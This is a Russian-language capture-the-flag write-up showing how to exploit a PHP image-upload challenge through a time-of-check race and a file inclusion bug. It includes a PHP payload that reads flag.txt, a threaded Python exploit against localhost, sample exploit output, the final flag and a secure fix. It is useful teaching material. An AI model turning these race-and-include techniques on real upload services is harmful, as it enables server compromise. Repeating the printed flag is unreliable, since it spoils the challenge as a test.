# 🎯 PHPickMeUp - Пошаговое решение

## 📋 Описание уязвимости

**TOCTOU (Time-of-Check-Time-of-Use)** + **LFI (Local File Inclusion)**

- **TOCTOU:** Временное окно между проверкой файла и его использованием
- **LFI:** Выполнение PHP кода через `include()` в view.php

---

## 🔍 Анализ кода

### 1. Уязвимость в index.php (строки 95-105):
```php
// Файл загружен
if (move_uploaded_file($fileTmp, $filePath)) {
    echo 'File uploaded successfully! Validating image...';
    
    // ⚠️ TOCTOU WINDOW - 1 секунда
    sleep(1);  
    
    // Проверка ПОСЛЕ задержки
    $imageInfo = getimagesize($filePath);
```

### 2. Уязвимость в view.php (строки 90-95):
```php
// ⚠️ LFI - прямое включение файла
include($filePath);  // Выполнит любой PHP код!
```

---

## 🛠️ Методы решения

### **Метод 1: Ручная эксплуатация**

#### Шаг 1: Подготовка файлов
```bash
# Создать минимальный валидный JPEG
echo -e '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xFF\xD9' > valid.jpg

# Создать PHP payload
echo '<?php echo file_get_contents("flag.txt"); exit; ?>' > payload.php
```

#### Шаг 2: Выполнение атаки
1. **Откройте:** http://localhost:8080
2. **Загрузите** valid.jpg через форму  
3. **Скопируйте File ID** из ответа (например: `img_123456789.abcdef`)
4. **В течение 1 секунды** замените файл:
   ```bash
   # Найти загруженный файл в uploads/
   cp payload.php uploads/img_123456789.abcdef.jpg
   ```
5. **Перейдите на:** http://localhost:8080/view.php?id=img_123456789.abcdef

#### Результат:
```html
<div class="image-container">
    <h3>📷 Image Preview:</h3>
    <!-- Including file for image preview template -->
    flag{race_condition_file_inclusion_1337}
</div>
```

---

### **Метод 2: Автоматическая эксплуатация**

#### Использование готового эксплойта:
```bash
python3 exploit.py http://localhost:8080
```

#### Пример вывода:
```
[+] Starting PHPickMeUp TOCTOU+LFI exploitation
[*] Creating valid JPEG file...
[*] Uploading file...
[+] File uploaded with ID: img_684efe996610b6.28426170
[*] Attempting to replace file during TOCTOU window...
[+] Successfully replaced file: uploads/img_684efe996610b6.28426170.jpg
[*] Triggering LFI via view.php...
[+] SUCCESS! Flag found: flag{race_condition_file_inclusion_1337}
```

---

### **Метод 3: Мультипоточная атака (продвинутый)**

```python
import threading
import requests
import time

def upload_file():
    files = {'image': ('test.jpg', jpeg_data, 'image/jpeg')}
    response = requests.post('http://localhost:8080/index.php', files=files)
    return extract_file_id(response.text)

def replace_file(file_id):
    time.sleep(0.3)  # Ждем загрузки
    payload = '<?php echo file_get_contents("flag.txt"); ?>'
    with open(f'uploads/{file_id}.jpg', 'w') as f:
        f.write(payload)

def exploit():
    file_id = upload_file()
    
    # Запускаем замену в отдельном потоке
    threading.Thread(target=replace_file, args=(file_id,)).start()
    
    time.sleep(1.5)  # Ждем завершения валидации
    
    # Триггерим LFI
    response = requests.get(f'http://localhost:8080/view.php?id={file_id}')
    return extract_flag(response.text)
```

---

## ⏰ Временная диаграмма атаки

```
Time:  0s ────── 0.1s ──── 1.0s ────── 1.1s ────── 1.5s
       │         │         │          │          │
       │         │         │          │          │
Upload │ Replace │         │ Validate │          │ Access
file   │ with    │  SLEEP  │ (fails   │          │ view.php
       │ PHP     │  (1s)   │  but too │          │ (executes
       │ code    │         │  late!)  │          │ PHP code)
       │         │         │          │          │
       └─────────┴─────────┴──────────┴──────────┴─────────→
                 ↑                              ↑
           TOCTOU WINDOW                  LFI TRIGGER
```

---

## 🎯 Ключевые моменты

### Почему работает:
1. **Файл загружается** → Сохраняется на диск
2. **Искусственная задержка** → `sleep(1)` создает окно
3. **Замена содержимого** → PHP код вместо изображения  
4. **Проверка getimagesize()** → Выполняется слишком поздно
5. **LFI в view.php** → `include()` выполняет PHP код

### Защита от атаки:
```php
// ❌ Уязвимый код:
move_uploaded_file($tmp, $path);
sleep(1);
if (!getimagesize($path)) unlink($path);

// ✅ Безопасный код:
$temp = tempnam(sys_get_temp_dir(), 'upload');
move_uploaded_file($tmp, $temp);
if (getimagesize($temp)) {
    rename($temp, $final_path);
} else {
    unlink($temp);
}
```

---

## 🏁 Финальный флаг

```
flag{race_condition_file_inclusion_1337}
```

---

**Категория:** Web Security  
**Уровень:** Medium  
**Техники:** TOCTOU, LFI, Race Condition, File Upload 